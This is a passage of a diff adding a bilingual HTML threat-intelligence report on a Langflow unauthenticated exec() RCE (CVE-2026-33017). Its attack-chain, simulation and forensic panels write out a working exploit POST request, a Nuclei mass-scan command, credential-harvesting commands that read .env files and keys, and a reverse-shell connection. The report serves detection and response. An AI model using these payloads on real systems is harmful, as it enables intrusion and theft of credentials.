@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CVE-2026-33017 — Langflow AI RCE | TI-DE</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='36' y2='36' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0%25' stop-color='%23e85d04'/%3E%3Cstop offset='100%25' stop-color='%23f48c06'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M18 2L4 7v10c0 8.5 5.9 16.4 14 18.5C26.1 33.4 32 25.5 32 17V7L18 2Z' fill='url(%23g)' opacity='.9'/%3E%3Ccircle cx='18' cy='18' r='6' stroke='%23fff' stroke-width='1.2' fill='none' opacity='.7'/%3E%3Ccircle cx='18' cy='18' r='2.5' fill='%23fff' opacity='.9'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="../../assets/report.css" />
+</head>
+<body>
+
+<!-- BACK BAR -->
+<div class="back-bar">
+  <a href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <span class="sep">/</span>
+  <a href="https://mazlumbaydar.github.io/TI-DE/">Reports</a>
+  <span class="sep">/</span>
+  <span class="current">CVE-2026-33017 — Langflow AI Unauthenticated RCE</span>
+</div>
+<div id="prog"></div>
+
+<!-- NAV -->
+<nav id="nav">
+  <a class="nav-brand" href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <ul class="nav-links">
+    <li><a href="#overview"    data-en="Overview"    data-tr="Genel Bakış">Overview</a></li>
+    <li><a href="#attack-chain" data-en="Attack"      data-tr="Saldırı">Attack</a></li>
+    <li><a href="#simulation"  data-en="Simulation"  data-tr="Simülasyon">Simulation</a></li>
+    <li><a href="#timeline"    data-en="Timeline"     data-tr="Zaman Çizelgesi">Timeline</a></li>
+    <li><a href="#detection"   data-en="Detection"   data-tr="Tespit">Detection</a></li>
+    <li><a href="#recommendations" data-en="Response" data-tr="Yanıt">Response</a></li>
+  </ul>
+  <div class="nav-controls">
+    <button id="langBtn"  class="nav-ctrl" onclick="toggleLang()"  title="Toggle language">🌐 TR</button>
+    <button id="themeBtn" class="nav-ctrl" onclick="toggleTheme()" title="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="badge-sev critical"><span class="live-dot"></span><span data-en="CVSS 9.8 — Critical — CISA KEV — Actively Exploited" data-tr="CVSS 9.8 — Kritik — CISA KEV — Aktif Olarak İstismar Edildi">CVSS 9.8 — Critical — CISA KEV — Actively Exploited</span></div>
+  <h1 class="hero-title">CVE-2026-33017<br>Langflow AI Pipeline<br><span data-en="Unauthenticated RCE" data-tr="Kimlik Doğrulamasız RCE">Unauthenticated RCE</span></h1>
+  <p class="hero-sub" data-en="Zero-auth Python exec() code injection — exploited within 20 hours of disclosure. Attackers harvesting OpenAI, Anthropic &amp; AWS API keys at scale." data-tr="Kimlik doğrulaması gerektirmeyen Python exec() kod enjeksiyonu — ifşadan 20 saat içinde istismar edildi. Saldırganlar büyük ölçekte OpenAI, Anthropic ve AWS API anahtarlarını topluyor.">Zero-auth Python exec() code injection — exploited within 20 hours of disclosure. Attackers harvesting OpenAI, Anthropic &amp; AWS API keys at scale.</p>
+  <div class="meta-strip">
+    <div class="meta-chip"><span data-en="Date" data-tr="Tarih">Date</span>: <span>27 March 2026</span></div>
+    <div class="meta-chip">CVSS: <span>9.8 Critical</span></div>
+    <div class="meta-chip">CWE: <span>CWE-94</span></div>
+    <div class="meta-chip">CISA KEV: <span>2026-03-25</span></div>
+    <div class="meta-chip"><span data-en="Fixed" data-tr="Düzeltme">Fixed</span>: <span>v1.9.0+</span></div>
+  </div>
+</section>
+
+<main>
+
+  <!-- ── OVERVIEW ── -->
+  <div class="stat-grid reveal" id="overview">
+    <div class="stat-card">
+      <div class="stat-num" data-t="9.8">0</div>
+      <div class="stat-label" data-en="CVSS Score" data-tr="CVSS Puanı">CVSS Score</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="20">0</div>
+      <div class="stat-label" data-en="Hours to Exploit" data-tr="İstismara Geçen Saat">Hours to Exploit</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="6">0</div>
+      <div class="stat-label" data-en="MITRE TTPs" data-tr="MITRE TTP'leri">MITRE TTPs</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="11">0</div>
+      <div class="stat-label" data-en="Platforms" data-tr="Platform">Platforms</div>
+    </div>
+  </div>
+
+  <!-- ── BACKGROUND ── -->
+  <div class="reveal" id="background">
+    <div class="section-label" data-en="Background" data-tr="Arka Plan">Background</div>
+    <h2 data-en="What Happened" data-tr="Ne Oldu">What Happened</h2>
+    <p data-en="&lt;strong&gt;CVE-2026-33017&lt;/strong&gt; is a critical unauthenticated remote code execution vulnerability in Langflow, the open-source visual platform for building AI-powered agents and workflows. The root cause is Python's &lt;code&gt;exec()&lt;/code&gt; function being called with attacker-controlled flow node data submitted to &lt;code&gt;POST /api/v1/build_public_tmp/{flow_id}/flow&lt;/code&gt; — an endpoint that requires &lt;strong&gt;no authentication whatsoever&lt;/strong&gt;."
+       data-tr="&lt;strong&gt;CVE-2026-33017&lt;/strong&gt;, yapay zeka destekli ajan ve iş akışları oluşturmak için kullanılan açık kaynaklı görsel platform Langflow'da kritik bir kimlik doğrulamasız uzaktan kod yürütme güvenlik açığıdır. Temel neden, Python'un &lt;code&gt;exec()&lt;/code&gt; fonksiyonunun &lt;code&gt;POST /api/v1/build_public_tmp/{flow_id}/flow&lt;/code&gt; endpoint'ine gönderilen saldırgan kontrollü akış düğümü verileriyle çağrılmasıdır — bu endpoint &lt;strong&gt;hiçbir kimlik doğrulaması gerektirmemektedir&lt;/strong&gt;.">
+      <strong>CVE-2026-33017</strong> is a critical unauthenticated remote code execution vulnerability in Langflow, the open-source visual platform for building AI-powered agents and workflows. The root cause is Python's <code>exec()</code> function being called with attacker-controlled flow node data submitted to <code>POST /api/v1/build_public_tmp/{flow_id}/flow</code> — an endpoint that requires <strong>no authentication whatsoever</strong>.
+    </p>
+    <p data-en="The Sysdig Threat Research Team observed the first exploitation attempts &lt;strong&gt;within 20 hours&lt;/strong&gt; of the advisory publication on 2026-03-17, with attackers deriving working exploits directly from the advisory text itself. CISA added CVE-2026-33017 to the Known Exploited Vulnerabilities catalog on 2026-03-25. JFrog subsequently discovered that version 1.8.2, widely reported as the remediation patch, remains vulnerable — only &lt;strong&gt;version 1.9.0+&lt;/strong&gt; fully remediates the vulnerability."
+       data-tr="Sysdig Tehdit Araştırma Ekibi, 2026-03-17 tarihli advisory yayınlanmasından &lt;strong&gt;20 saat içinde&lt;/strong&gt; ilk istismar girişimlerini gözlemledi; saldırganlar çalışan exploitleri doğrudan advisory metninden türetti. CISA, CVE-2026-33017'yi 2026-03-25 tarihinde Bilinen İstismar Edilen Güvenlik Açıkları kataloğuna ekledi. JFrog ise sonradan yaygın olarak yama olarak raporlanan 1.8.2 sürümünün hâlâ savunmasız olduğunu keşfetti — güvenlik açığını tam olarak yalnızca &lt;strong&gt;1.9.0+ sürümü&lt;/strong&gt; gidermektedir.">
+      The Sysdig Threat Research Team observed the first exploitation attempts <strong>within 20 hours</strong> of the advisory publication on 2026-03-17, with attackers deriving working exploits directly from the advisory text itself. CISA added CVE-2026-33017 to the Known Exploited Vulnerabilities catalog on 2026-03-25. JFrog subsequently discovered that version 1.8.2, widely reported as the remediation patch, remains vulnerable — only <strong>version 1.9.0+</strong> fully remediates the vulnerability.
+    </p>
+
+    <div class="warn-box">
+      <strong data-en="Patch immediately:" data-tr="Hemen yama uygulayın:">Patch immediately:</strong>
+      <span data-en=" Upgrade to Langflow 1.9.0+. Version 1.8.2 is NOT a complete fix. Unauthenticated — any network access to the Langflow port is sufficient for full RCE."
+            data-tr=" Langflow 1.9.0+ sürümüne yükseltin. 1.8.2 sürümü TAM bir düzeltme DEĞİLDİR. Kimlik doğrulamasız — tam RCE için Langflow portuna herhangi bir ağ erişimi yeterlidir.">
+        Upgrade to Langflow 1.9.0+. Version 1.8.2 is NOT a complete fix. Unauthenticated — any network access to the Langflow port is sufficient for full RCE.
+      </span>
+    </div>
+
+    <div class="detail-grid">
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Vulnerability Details" data-tr="Güvenlik Açığı Detayları">Vulnerability Details</div>
+        <div class="detail-row"><div class="detail-key">CVE</div><div class="detail-val">CVE-2026-33017</div></div>
+        <div class="detail-row"><div class="detail-key">CVSS</div><div class="detail-val" style="color:var(--red);font-weight:700">9.8 Critical</div></div>
+        <div class="detail-row"><div class="detail-key">CWE</div><div class="detail-val">CWE-94 (Code Injection)</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Product" data-tr="Ürün">Product</div><div class="detail-val">Langflow AI Pipelines</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Auth Required" data-tr="Auth Gerekli">Auth Required</div><div class="detail-val" style="color:var(--red)" data-en="None" data-tr="Yok">None</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Affected" data-tr="Etkilenen">Affected</div><div class="detail-val">All versions ≤ 1.8.1</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Fixed" data-tr="Düzeltme">Fixed</div><div class="detail-val">Version 1.9.0+</div></div>
+        <div class="detail-row"><div class="detail-key">CISA KEV</div><div class="detail-val" data-en="Added 2026-03-25" data-tr="Eklendi 2026-03-25">Added 2026-03-25</div></div>
+      </div>
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Exploitation Context" data-tr="İstismar Bağlamı">Exploitation Context</div>
+        <div class="detail-row"><div class="detail-key" data-en="First Exploit" data-tr="İlk İstismar">First Exploit</div><div class="detail-val" data-en="20 hrs post-advisory" data-tr="Advisory'den 20 saat sonra">20 hrs post-advisory</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Attack Vector" data-tr="Saldırı Vektörü">Attack Vector</div><div class="detail-val" data-en="Network (single HTTP POST)" data-tr="Ağ (tek HTTP POST)">Network (single HTTP POST)</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Scanner Used" data-tr="Kullanılan Tarayıcı">Scanner Used</div><div class="detail-val">Nuclei (automated)</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Payload" data-tr="Yük">Payload</div><div class="detail-val" data-en="Python exec() — no sandbox" data-tr="Python exec() — sandbox yok">Python exec() — no sandbox</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Post-Exploit" data-tr="Sonrası">Post-Exploit</div><div class="detail-val" data-en="Shell spawn + API key theft" data-tr="Shell başlatma + API key çalma">Shell spawn + API key theft</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Targets" data-tr="Hedefler">Targets</div><div class="detail-val">OpenAI, Anthropic, AWS keys</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Exfil" data-tr="Sızdırma">Exfil</div><div class="detail-val" data-en="Base64-encoded HTTP callback" data-tr="Base64 kodlu HTTP callback">Base64-encoded HTTP callback</div></div>
+        <div class="detail-row"><div class="detail-key" data-en="Fixed In" data-tr="Düzeltilen">Fixed In</div><div class="detail-val" style="color:var(--green)">1.9.0+</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── ATTACK CHAIN — RED TEAM ── -->
+  <div class="reveal" id="attack-chain">
+    <div class="team-label team-red">🔴 <span data-en="RED TEAM" data-tr="KIRMIZI TAKIM">RED TEAM</span></div>
+    <div class="section-label" data-en="Attack Flow" data-tr="Saldırı Akışı">Attack Flow</div>
+    <h2 data-en="Attack Chain" data-tr="Saldırı Zinciri">Attack Chain</h2>
+    <div class="chain-container" id="chainSteps">
+
+      <div class="chain-step" style="--delay:0s">
+        <div class="chain-icon" style="border-color:var(--accent);color:var(--accent)">🎯</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 1 — Nuclei Scanning" data-tr="Adım 1 — Nuclei Taraması">Step 1 — Nuclei Scanning</div>
+          <div class="chain-desc" data-en="Attacker uses published Nuclei template derived from advisory text. Scans internet for exposed Langflow instances on port 7860. Zero-day window: 20 hours." data-tr="Saldırgan, advisory metninden türetilmiş yayınlanmış Nuclei şablonunu kullanır. 7860 numaralı portta internete açık Langflow instance'larını tarar. Sıfır gün penceresi: 20 saat.">Attacker uses published Nuclei template derived from advisory text. Scans internet for exposed Langflow instances on port 7860. Zero-day window: 20 hours.</div>
+          <span class="chain-ttp">T1595.001 — Scanning IP Blocks</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent2);color:var(--accent2)">🌐</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 2 — Unauthenticated HTTP POST" data-tr="Adım 2 — Kimlik Doğrulamasız HTTP POST">Step 2 — Unauthenticated HTTP POST</div>
+          <div class="chain-desc" data-en="POST /api/v1/build_public_tmp/{flow_id}/flow with JSON payload containing Python code in node.template.code.value. No auth token required." data-tr="node.template.code.value içinde Python kodu barındıran JSON yüküyle POST /api/v1/build_public_tmp/{flow_id}/flow. Auth token gerekli değil.">POST /api/v1/build_public_tmp/{flow_id}/flow with JSON payload containing Python code in node.template.code.value. No auth token required.</div>
+          <span class="chain-ttp">T1190 — Exploit Public-Facing Application</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent3);color:var(--accent3)">🐍</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 3 — Python exec() Code Injection" data-tr="Adım 3 — Python exec() Kod Enjeksiyonu">Step 3 — Python exec() Code Injection</div>
+          <div class="chain-desc" data-en="Langflow flow engine extracts the code value and passes it directly to Python's exec(). No sandboxing, no AST analysis, no allowlist. Full Python runtime access." data-tr="Langflow akış motoru, code değerini çıkarır ve doğrudan Python'un exec() fonksiyonuna geçirir. Sandbox yok, AST analizi yok, allowlist yok. Tam Python runtime erişimi.">Langflow flow engine extracts the code value and passes it directly to Python's exec(). No sandboxing, no AST analysis, no allowlist. Full Python runtime access.</div>
+          <span class="chain-ttp">T1059.006 — Python</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:#a8dadc;color:#a8dadc">🔓</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 4 — Shell Spawn + API Key Harvest" data-tr="Adım 4 — Shell Başlatma + API Key Toplama">Step 4 — Shell Spawn + API Key Harvest</div>
+          <div class="chain-desc" data-en="Reverse shell established. .env file read: OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS credentials, Hugging Face tokens." data-tr="Reverse shell kuruldu. .env dosyası okundu: OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS kimlik bilgileri, Hugging Face tokenları.">.env file read: OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS credentials, Hugging Face tokens. Reverse shell established back to attacker C2.</div>
+          <span class="chain-ttp">T1552.001 — Credentials in Files</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--red);color:var(--red)">🔁</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 5 — Persistence + Exfiltration" data-tr="Adım 5 — Kalıcılık + Dışarıya Sızdırma">Step 5 — Persistence + Exfiltration</div>
+          <div class="chain-desc" data-en="Cron job added to maintain access. API keys exfiltrated to C2 via HTTPS POST. AI workflows compromised for prompt injection / data poisoning." data-tr="Erişimi sürdürmek için cron job eklendi. API key'ler HTTPS POST aracılığıyla C2'ye sızdırıldı. AI iş akışları prompt injection / data poisoning için tehlikeye atıldı.">Cron job added to maintain access. API keys exfiltrated to C2 via HTTPS POST. AI workflows compromised for prompt injection / data poisoning.</div>
+          <span class="chain-ttp">T1053.003 — Cron</span>
+          <span class="chain-ttp">T1041 — Exfiltration Over C2</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ── SIMULATION — RED TEAM ── -->
+  <div class="reveal" id="simulation">
+    <div class="team-label team-red">🔴 <span data-en="RED TEAM" data-tr="KIRMIZI TAKIM">RED TEAM</span></div>
+    <div class="section-label" data-en="Attack Simulation" data-tr="Saldırı Simülasyonu">Attack Simulation</div>
+    <h2 data-en="Interactive Attack Simulation" data-tr="Etkileşimli Saldırı Simülasyonu">Interactive Attack Simulation</h2>
+
+    <div class="atk-viz">
+      <div class="atk-viz-top">
+        <div>
+          <div class="atk-detail-step" id="simStepLabel">STEP 1 — Target Discovery (Mar 17 + 20 hrs)</div>
+        </div>
+        <div class="atk-btns">
+          <button class="atk-play step-btn" id="stepBtn" onclick="simStep()">STEP ›</button>
+          <button class="atk-play" id="autoBtn" onclick="simAuto()">▶ AUTO</button>
+        </div>
+      </div>
+
+      <!-- Pipeline nodes -->
+      <div class="atk-pipeline" id="simPipeline">
+
+        <div class="atk-node" id="node0" onclick="simJump(0)">
+          <div class="atk-node-box">🎯</div>
+          <div class="atk-node-label" data-en="Attacker" data-tr="Saldırgan">Attacker</div>
+        </div>
+
+        <div class="atk-connector" id="conn0">
+          <svg><line class="conn-line" x1="0" y1="12" x2="100%" y2="12"/><polygon class="conn-arrow" points="0,-4 8,0 0,4" transform="translate(100%,12) rotate(0)"/></svg>
+          <div class="atk-pkt orange" id="pkt0"></div>
+        </div>
+
+        <div class="atk-node" id="node1" onclick="simJump(1)">
+          <div class="atk-node-box">🌐</div>
+          <div class="atk-node-label" data-en="HTTP/S Request" data-tr="HTTP/S İstek">HTTP/S Request</div>
+        </div>
+
+        <div class="atk-connector" id="conn1">
+          <svg><line class="conn-line" x1="0" y1="12" x2="100%" y2="12"/><polygon class="conn-arrow" points="0,-4 8,0 0,4" transform="translate(100%,12) rotate(0)"/></svg>
+          <div class="atk-pkt orange" id="pkt1"></div>
+        </div>
+
+        <div class="atk-node" id="node2" onclick="simJump(2)">
+          <div class="atk-node-box">🤖</div>
+          <div class="atk-node-label" data-en="Langflow API" data-tr="Langflow API">Langflow API</div>
+        </div>
+
+        <div class="atk-connector" id="conn2">
+          <svg><line class="conn-line" x1="0" y1="12" x2="100%" y2="12"/><polygon class="conn-arrow" points="0,-4 8,0 0,4" transform="translate(100%,12) rotate(0)"/></svg>
+          <div class="atk-pkt red" id="pkt2"></div>
+        </div>
+
+        <div class="atk-node" id="node3" onclick="simJump(3)">
+          <div class="atk-node-box">🐍</div>
+          <div class="atk-node-label" data-en="exec() RCE" data-tr="exec() RCE">exec() RCE</div>
+        </div>
+
+        <div class="atk-connector" id="conn3">
+          <svg><line class="conn-line" x1="0" y1="12" x2="100%" y2="12"/><polygon class="conn-arrow" points="0,-4 8,0 0,4" transform="translate(100%,12) rotate(0)"/></svg>
+          <div class="atk-pkt red" id="pkt3"></div>
+        </div>
+
+        <div class="atk-node" id="node4" onclick="simJump(4)">
+          <div class="atk-node-box">🔓</div>
+          <div class="atk-node-label" data-en="Root Shell" data-tr="Root Shell">Root Shell</div>
+        </div>
+
+        <div class="atk-connector" id="conn4">
+          <svg><line class="conn-line" x1="0" y1="12" x2="100%" y2="12"/><polygon class="conn-arrow" points="0,-4 8,0 0,4" transform="translate(100%,12) rotate(0)"/></svg>
+          <div class="atk-pkt red" id="pkt4"></div>
+        </div>
+
+        <div class="atk-node" id="node5" onclick="simJump(5)">
+          <div class="atk-node-box">💰</div>
+          <div class="atk-node-label" data-en="API Keys Stolen" data-tr="API Anahtarları Çalındı">API Keys Stolen</div>
+        </div>
+
+      </div>
+
+      <!-- Detail panel -->
+      <div class="atk-detail">
+        <div class="atk-detail-text" id="simText">Attacker derives a working exploit directly from advisory text and converts it to a Nuclei template. Mass scanning begins immediately, targeting port 7860 on cloud providers.</div>
+        <div class="atk-detail-cmd" id="simCmd">nuclei -t langflow-rce-cve-2026-33017.yaml \
+  -list cloud_ips.txt -rate-limit 1000
+
+# Template checks: POST /api/v1/build_public_tmp/test/flow
+# Success: HTTP 200 with exec() output in response</div>
+      </div>
+
+      <!-- Explain panel -->
+      <div class="atk-explain">
+        <div class="atk-explain-label" data-en="Why This Works" data-tr="Neden İşe Yarar">Why This Works</div>
+        <div id="simExplain">Nuclei templates for known CVEs are publicly available within hours of disclosure. This means the attacker only needs to know the CVE exists, not reverse-engineer the vulnerability themselves.</div>
+      </div>
+
+      <!-- Progress dots -->
+      <div class="atk-progress">
+        <div class="atk-dot current" id="dot0" onclick="simJump(0)"></div>
+        <div class="atk-dot" id="dot1" onclick="simJump(1)"></div>
+        <div class="atk-dot" id="dot2" onclick="simJump(2)"></div>
+        <div class="atk-dot" id="dot3" onclick="simJump(3)"></div>
+        <div class="atk-dot" id="dot4" onclick="simJump(4)"></div>
+        <div class="atk-dot" id="dot5" onclick="simJump(5)"></div>
+        <div class="atk-prog-label" id="simProgLabel">1 / 6</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── MITRE ATT&CK TIMELINE — RED TEAM ── -->
+  <div class="reveal" id="timeline">
+    <div class="team-label team-red">🔴 <span data-en="RED TEAM" data-tr="KIRMIZI TAKIM">RED TEAM</span></div>
+    <div class="section-label" data-en="Threat Intelligence" data-tr="Tehdit İstihbaratı">Threat Intelligence</div>
+    <h2 data-en="MITRE ATT&amp;CK Timeline — DFIR Evidence" data-tr="MITRE ATT&amp;CK Zaman Çizelgesi — DFIR Kanıtı">MITRE ATT&amp;CK Timeline — DFIR Evidence</h2>
+
+    <div class="mtt">
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Initial Access" data-tr="İlk Erişim">Initial Access</div>
+        <div class="mtt-technique-title" data-en="T1190 — Exploit Public-Facing Application" data-tr="T1190 — Halka Açık Uygulamayı İstismar Etme">T1190 — Exploit Public-Facing Application</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1190</span></div>
+        <div class="mtt-desc" data-en="Unauthenticated POST request to &lt;strong&gt;/api/v1/build_public_tmp/{flow_id}/flow&lt;/strong&gt; returning HTTP 200 with exec() stdout confirms exploitation. No brute-force, no token bypass — the endpoint is openly accessible by design of the vulnerable version." data-tr="&lt;strong&gt;/api/v1/build_public_tmp/{flow_id}/flow&lt;/strong&gt; adresine yapılan kimlik doğrulamasız POST isteğinin exec() çıktısıyla birlikte HTTP 200 döndürmesi istismarı doğrular. Brute-force yok, token bypass yok — endpoint, savunmasız sürümün tasarımı gereği açıkça erişilebilir durumda.">Unauthenticated POST request to <strong>/api/v1/build_public_tmp/{flow_id}/flow</strong> returning HTTP 200 with exec() stdout confirms exploitation. No brute-force, no token bypass — the endpoint is openly accessible by design of the vulnerable version.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Forensic Evidence" data-tr="Adli Kanıt">Forensic Evidence</span>
+            <span class="mtt-evidence-src">HTTP access log / WAF</span>
+          </div>
+          <div class="mtt-evidence-body">POST /api/v1/build_public_tmp/aaaa1111/flow HTTP/1.1
+Host: langflow.victim.ai:7860
+Content-Type: application/json
+Content-Length: 287
+
+{"nodes":[{"data":{"node":{"template":{"code":{"value":"import os; os.system('id')"}}}}}]}
+
+HTTP/1.1 200 OK
+{"result": "uid=0(root) gid=0(root) groups=0(root)"}</div>
+        </div>
+        <div class="mtt-annotation" data-en="&lt;strong&gt;Detection signal:&lt;/strong&gt; The endpoint returning 200 with exec() output is self-confirming exploitation. Any HTTP 200 from build_public_tmp with code output in body is high-fidelity." data-tr="&lt;strong&gt;Tespit sinyali:&lt;/strong&gt; Endpoint'in exec() çıktısıyla 200 döndürmesi kendini doğrulayan bir istismar göstergesidir. build_public_tmp'den body'de kod çıktısıyla gelen herhangi bir HTTP 200, yüksek güvenilirlikte bir sinyaldir."><strong>Detection signal:</strong> The endpoint returning 200 with exec() output is self-confirming exploitation. Any HTTP 200 from build_public_tmp with code output in body is high-fidelity.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Execution" data-tr="Yürütme">Execution</div>
+        <div class="mtt-technique-title" data-en="T1059.006 — Python" data-tr="T1059.006 — Python">T1059.006 — Python</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1059.006</span></div>
+        <div class="mtt-desc" data-en="Python subprocess spawning bash; socket.connect() to external IP from Langflow process. The exec() call inherits the full Python globals — no import restrictions, no restricted builtins. Attacker code runs in the same memory space as the Langflow application." data-tr="Python subprocess bash başlatıyor; Langflow sürecinden harici IP'ye socket.connect() çağrısı yapılıyor. exec() çağrısı tam Python global'lerini devralır — import kısıtlaması yok, kısıtlı built-in yok. Saldırgan kodu, Langflow uygulamasıyla aynı bellek alanında çalışır.">Python subprocess spawning bash; socket.connect() to external IP from Langflow process. The exec() call inherits the full Python globals — no import restrictions, no restricted builtins. Attacker code runs in the same memory space as the Langflow application.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Forensic Evidence" data-tr="Adli Kanıt">Forensic Evidence</span>
+            <span class="mtt-evidence-src">EDR process tree / auditd</span>
+          </div>
+          <div class="mtt-evidence-body">PROCESS TREE:
+uvicorn (pid 1234) → python3 (pid 1235)
+  └─ bash -i (pid 2100)  ← ANOMALY
+       └─ sh -c "cat /app/.env" (pid 2101)
+
+NETWORK:
+python3 [pid 1235] → 185.220.x.x:4444 [ESTABLISHED]
+  Socket type: SOCK_STREAM (TCP reverse shell)</div>
+        </div>
+        <div class="mtt-annotation" data-en="&lt;strong&gt;Detection signal:&lt;/strong&gt; Parent process 'langflow' or 'uvicorn' spawning bash is high-fidelity — never legitimate in production AI deployments." data-tr="&lt;strong&gt;Tespit sinyali:&lt;/strong&gt; 'langflow' veya 'uvicorn' parent sürecinin bash başlatması yüksek güvenilirlikte bir sinyaldir — üretim AI dağıtımlarında hiçbir zaman meşru değildir."><strong>Detection signal:</strong> Parent process 'langflow' or 'uvicorn' spawning bash is high-fidelity — never legitimate in production AI deployments.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Discovery + Credential Access" data-tr="Keşif + Kimlik Bilgisi Erişimi">Discovery + Credential Access</div>
+        <div class="mtt-technique-title" data-en="T1083 — File &amp; Directory Discovery / T1552.001 — Credentials in Files" data-tr="T1083 — Dosya ve Dizin Keşfi / T1552.001 — Dosyalardaki Kimlik Bilgileri">T1083 — File &amp; Directory Discovery / T1552.001 — Credentials in Files</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1083</span><span class="mtt-tid">T1552.001</span></div>
+        <div class="mtt-desc" data-en="&lt;code&gt;cat /app/.env&lt;/code&gt;, &lt;code&gt;env | base64&lt;/code&gt;, &lt;code&gt;find / -name '*.pem'&lt;/code&gt; executed by Langflow process. AI/ML services hold disproportionate credential value — OpenAI and Anthropic API keys grant direct access to expensive compute resources that can be monetized immediately." data-tr="&lt;code&gt;cat /app/.env&lt;/code&gt;, &lt;code&gt;env | base64&lt;/code&gt;, &lt;code&gt;find / -name '*.pem'&lt;/code&gt; komutları Langflow süreci tarafından yürütüldü. AI/ML servisleri orantısız derecede değerli kimlik bilgileri barındırır — OpenAI ve Anthropic API key'leri, anında paraya çevrilebilen pahalı hesaplama kaynaklarına doğrudan erişim sağlar."><code>cat /app/.env</code>, <code>env | base64</code>, <code>find / -name '*.pem'</code> executed by Langflow process. AI/ML services hold disproportionate credential value — OpenAI and Anthropic API keys grant direct access to expensive compute resources that can be monetized immediately.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Forensic Evidence" data-tr="Adli Kanıt">Forensic Evidence</span>
+            <span class="mtt-evidence-src">auditd / bash_history</span>
+          </div>
+          <div class="mtt-evidence-body">AUDIT LOG (syscall=openat):
+pid=2101  ppid=2100  comm="cat"  exe="/usr/bin/cat"
+  name="/app/.env"  success=yes  auid=0
+
+COMMANDS EXECUTED (from bash pid 2100):
+cat /app/.env
+env | base64
+find / -name "*.key" -o -name "*.pem" 2>/dev/null
+cat ~/.config/langflow/langflow.db</div>
+        </div>
+        <div class="mtt-annotation" data-en="&lt;strong&gt;Detection signal:&lt;/strong&gt; AI/ML services hold disproportionate credential value — .env files are primary target. Cat of .env by web process is always anomalous." data-tr="&lt;strong&gt;Tespit sinyali:&lt;/strong&gt; AI/ML servisleri orantısız derecede değerli kimlik bilgileri barındırır — .env dosyaları birincil hedeftir. Web süreci tarafından .env okunması her zaman anormaldir."><strong>Detection signal:</strong> AI/ML services hold disproportionate credential value — .env files are primary target. Cat of .env by web process is always anomalous.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Persistence" data-tr="Kalıcılık">Persistence</div>
+        <div class="mtt-technique-title" data-en="T1053.003 — Cron" data-tr="T1053.003 — Cron">T1053.003 — Cron</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1053.003</span></div>
+        <div class="mtt-desc" data-en="crontab -l showing new entry pointing to /tmp/.lf/backdoor.py; /tmp/.lf/ directory creation via mktemp. The cron mechanism survives application restarts and, if the container mounts host filesystem, persists across container replacement." data-tr="crontab -l komutu /tmp/.lf/backdoor.py'ye işaret eden yeni girişi gösteriyor; mktemp aracılığıyla /tmp/.lf/ dizini oluşturuldu. Cron mekanizması uygulama yeniden başlatmalarını atlatır ve container host dosya sistemini mount ediyorsa container değişikliğinde de devam eder.">crontab -l showing new entry pointing to /tmp/.lf/backdoor.py; /tmp/.lf/ directory creation via mktemp. The cron mechanism survives application restarts and, if the container mounts host filesystem, persists across container replacement.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Forensic Evidence" data-tr="Adli Kanıt">Forensic Evidence</span>
